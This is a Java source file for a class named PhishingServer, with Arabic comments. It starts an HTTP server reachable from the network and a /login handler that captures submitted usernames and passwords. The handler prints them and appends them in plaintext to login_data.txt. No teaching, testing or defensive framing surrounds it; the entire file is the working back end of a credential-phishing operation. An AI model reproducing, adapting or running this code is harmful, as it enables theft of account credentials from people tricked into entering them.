import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

import java.io.IOException;
import java.io.OutputStream;
import java.io.File;
import java.io.FileWriter;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.InetSocketAddress;

public class PhishingServer {

    public static void main(String[] args) throws IOException {
        // إنشاء سيرفر HTTP على المنفذ 8080
        HttpServer server = HttpServer.create(new InetSocketAddress("0.0.0.0", 8080), 0); // "0.0.0.0" للوصول من الشبكة
        System.out.println("السيرفر بدأ على المنفذ 8080...");

        // تحديد المسار لمعالجة الطلبات
        server.createContext("/login", new LoginHandler());

        // تشغيل السيرفر
        server.setExecutor(null); // استخدام التنفيذي الافتراضي
        server.start();
    }

    // معالج الطلبات
    static class LoginHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            if ("POST".equalsIgnoreCase(exchange.getRequestMethod())) {
                // قراءة البيانات الواردة
                BufferedReader reader = new BufferedReader(new InputStreamReader(exchange.getRequestBody()));
                StringBuilder formData = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    formData.append(line);
                }

                // فك تشفير البيانات
                String[] pairs = formData.toString().split("&");
                String username = "";
                String password = "";

                for (String pair : pairs) {
                    String[] keyValue = pair.split("=");
                    if (keyValue.length == 2) {
                        String key = keyValue[0];
                        String value = keyValue[1].replace("+", " ");
                        if ("username".equals(key)) {
                            username = java.net.URLDecoder.decode(value, "UTF-8");
                        } else if ("password".equals(key)) {
                            password = java.net.URLDecoder.decode(value, "UTF-8");
                        }
                    }
                }

                // تسجيل البيانات
                System.out.println("بيانات المستخدم:");
                System.out.println("اسم المستخدم: " + username);
                System.out.println("كلمة المرور: " + password);

                // حفظ البيانات في ملف (اختياري)
                saveDataToFile(username, password);

                // إرسال رد إلى العميل (اختياري)
                String response = "OK";
                exchange.sendResponseHeaders(200, response.getBytes().length);
                OutputStream os = exchange.getResponseBody();
                os.write(response.getBytes());
                os.close();
            } else {
                // معالجة طلبات غير صالحة
                exchange.sendResponseHeaders(405, -1); // طريقة غير مسموحة
                exchange.close();
            }
        }

        // حفظ البيانات في ملف
        private void saveDataToFile(String username, String password) {
            try {
                File logFile = new File("login_data.txt");
                if (!logFile.exists()) {
                    logFile.createNewFile();
                }
                FileWriter writer = new FileWriter(logFile, true); // وضع الإضافة
                writer.write("اسم المستخدم: " + username + " | كلمة المرور: " + password + "\n");
                writer.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}